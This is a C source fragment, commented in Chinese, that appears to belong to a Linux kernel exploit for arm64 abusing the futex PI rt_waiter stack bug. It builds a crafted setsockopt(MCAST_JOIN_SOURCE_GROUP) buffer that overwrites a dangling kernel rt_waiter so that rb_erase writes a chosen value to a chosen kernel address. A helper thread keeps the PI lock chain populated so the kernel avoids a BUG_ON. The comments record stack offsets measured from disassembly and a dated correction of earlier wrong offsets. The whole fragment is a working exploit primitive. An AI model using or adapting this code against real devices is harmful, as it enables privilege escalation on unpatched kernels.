
/* ===== DIAG=8: setsockopt stamp (MCAST_JOIN_SOURCE_GROUP, 0x108) =====
 * 几何依据（重建75/76/78，反汇编实测）：
 *   rt_waiter = do_futex 的 x29-0xC0 = STP-0x120，长 0x50
 *   do_ip_setsockopt 的 sp = STP-0x210，greqs = sp+0x20 = STP-0x1F0，长 0x108
 *   => waiter 在 buf 中的偏移 = 0xD0；覆盖 waiter+0x00..+0x37
 * 原语（重建78，反汇编闭环）：
 *   buf[0xD0]=V(pc) / buf[0xD8]=0(rb_right) / buf[0xE0]=T(rb_left)
 *   => rb_erase 走 !child 分支 => *(T) = V，且 parent=V&~3
 *   取 V∈{0,1,2,3} 使 parent=0，无额外副作用
 * 依赖：真实 f_pi_chain 上必须已有 waiter（否则 rt_mutex_top_waiter BUG_ON）
 */
#define STAMP_BUF_LEN      0x108
/* ★ 2026-10-22 纠错：本文件未被任何 .c include（死代码），
 * 但旧值 0xD0/0xA8 的几何是错的，必须与 main.c 保持一致：
 * 正确整链（含 sock_common_setsockopt 0x10 层）：
 *   SyS_setsockopt 0x50 + sock_common 0x10 + udp 0x10 + ip 0x30 + do_ip 0x190
 *   => buf = S-0x210；rt_waiter = S-0x190 => waiter 在 buf 内偏移 0x80
 * 字段（相对 waiter）：pc+0x00 right+0x08 left+0x10 task+0x30 lock+0x38 prio+0x40 dl+0x48
 */
#define STAMP_WAITER_OFF   0x80
#define STAMP_PC_OFF       (STAMP_WAITER_OFF + 0x00)
#define STAMP_RIGHT_OFF    (STAMP_WAITER_OFF + 0x08)
#define STAMP_LEFT_OFF     (STAMP_WAITER_OFF + 0x10)

static int stamp_fd = -1;
static unsigned char stamp_buf[STAMP_BUF_LEN] __attribute__((aligned(16)));

static void stamp_buf_init(uintptr_t target, long value) {
  memset(stamp_buf, 0, sizeof(stamp_buf));
  uint64_t *p = (uint64_t *)stamp_buf;
  p[STAMP_PC_OFF / 8]    = (uint64_t)value;   /* pc  : V (0..3) */
  p[STAMP_RIGHT_OFF / 8] = 0;                 /* right: NULL  */
  p[STAMP_LEFT_OFF / 8]  = (uint64_t)target;  /* left : T     */
}

static void stamp_fd_prepare(void) {
  if (stamp_fd >= 0) return;
  stamp_fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (stamp_fd < 0) pr_error("stamp: socket failed errno=%d\n", errno);
}

/* 必须在 futex 返回后、任何其他系统调用之前调用 */
static void stamp_do(void) {
  if (stamp_fd < 0) return;
  errno = 0;
  int r = setsockopt(stamp_fd, IPPROTO_IP, MCAST_JOIN_SOURCE_GROUP,
                     stamp_buf, sizeof(stamp_buf));
  int e = errno;
  /* 预期失败(EADDRNOTAVAIL/EINVAL)：family 校验在 copy_from_user 之后，
     stamp 已生效，失败是正常且期望的。 */
  ckpt_val("stamp_ret", (long)r);
  ckpt_val("stamp_errno", (long)e);
}

/* 第4线程：在 owner 持锁期间对 f_pi_chain 排队，保证真实锁树非空 */
void *parker_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  while (!atomic_load(&owner_started)) usleep(1000);
  atomic_store(&parker_ready, 1);
  /* FUTEX_LOCK_PI 会阻塞，不会返回（直到 owner 释放） */
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&parker_done, 1);
  return NULL;
}
